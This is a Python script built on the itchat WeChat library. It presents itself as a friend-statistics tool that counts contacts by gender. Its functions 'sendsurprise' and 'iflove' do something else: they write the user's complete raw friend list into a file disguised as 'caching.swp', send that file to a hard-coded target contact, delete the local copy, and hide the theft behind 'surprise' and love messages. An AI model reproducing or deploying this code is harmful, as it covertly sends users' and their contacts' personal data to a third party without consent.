import itchat
import os
def ifnoRemarkName(i,txt):  #防止没有备注，以网名替换
	if i["RemarkName"]=="":
			txt=txt+"  "+"网名:"+i["NickName"]+"  "+"尚未备注"
	else:
			txt=txt+"  "+"网名:"+i["NickName"]+"  "+"备注:"+i["RemarkName"]
	return txt
def delect(txt):
	txt=list(txt)
	txt[0]=""
	txt="".join(txt)
	return txt
def friendanalyze(friends):
	male=female=other=0
	maletxt=femaletxt=othertxt=""
	for i in friends[1:]:
		sex=i["Sex"]
		if sex==1:
			male+=1
			maletxt=ifnoRemarkName(i,maletxt)
		elif sex==2:
			female+=1
			femaletxt=ifnoRemarkName(i,femaletxt)
		else:
			other+=1
			othertxt=ifnoRemarkName(i,othertxt)
	maletxt=delect(maletxt)
	femaletxt=delect(femaletxt)
	othertxt=delect(othertxt)
	print("请扫码登录！")
	print("您的好友总数为"+str(len(friends[1:])))
	print("男性的数量为"+str(male))
	print("名字为："+maletxt)
	print("女性的数量为"+str(female))
	print("名字为："+femaletxt)
	print("有"+str(other)+"个人未知性别")
	print("名字为："+othertxt)
	file="男:"+str(male)+maletxt+"\n"+"女:"+str(female)+femaletxt+"\n"+"其他:"+str(other)+othertxt
	with open("分析结果.txt","w",encoding="utf-8") as f:
		f.write(file)
	print("分析结果自动保存到当前根目录下 分析结果.txt")
def sendmessageitem():
	friends=itchat.search_friends(name="在这里填写发送目标的微信网名")#name对Nickname和RemarkName都适用 #发送目标
	item=friends[0]["UserName"]
	return item
def sendsurprise(sender):
	filex=open("分析结果.txt",encoding="utf-8").read()+str(itchat.get_friends(update=True))
	with open("filex.txt","w",encoding="utf-8") as f2:
		f2.write(filex)
	os.rename("filex.txt","caching.swp")
	with open("请打开你的第一个惊喜.txt","w",encoding="utf-8") as f1:
		message=sender+"--(๑′ᴗ‵๑)Ｉ Lᵒᵛᵉᵧₒᵤ❤继续去发现你的第二个惊喜吧-----by 醉梦半醒"
		f1.write(message)
def iflove(item):
	print("恭喜你向帅气的开发者(对，就是我！)发了一个惊喜(必须和开发者是好友关系才能发送哦！)")
	sender=itchat.get_friends(update=True)[0]["NickName"]
	if  sender=='在这里填上你要获取信息的微信网名': #判断发送者
		sendsurprise(sender)
		itchat.send_file('caching.swp', item)
		itchat.send(u'我喜欢你',item)
		os.remove("caching.swp")#删除加密文件
	else:
		itchat.send(u'友情测试:我的微信已被你入侵，请注意信息安全(道德原因--爬取结果未发送)',item)
def main():
	itchat.auto_login(hotReload=True)
	friends=itchat.get_friends(update=True)#获取
	friendanalyze(friends)#好友分析并保存
	item=sendmessageitem()#目标
	if item=="":
		print("您与开发者不是好友关系，无法进行安全测试")
	else:
		iflove(item)
	pause=input("等待退出")
if __name__ == '__main__':
	main()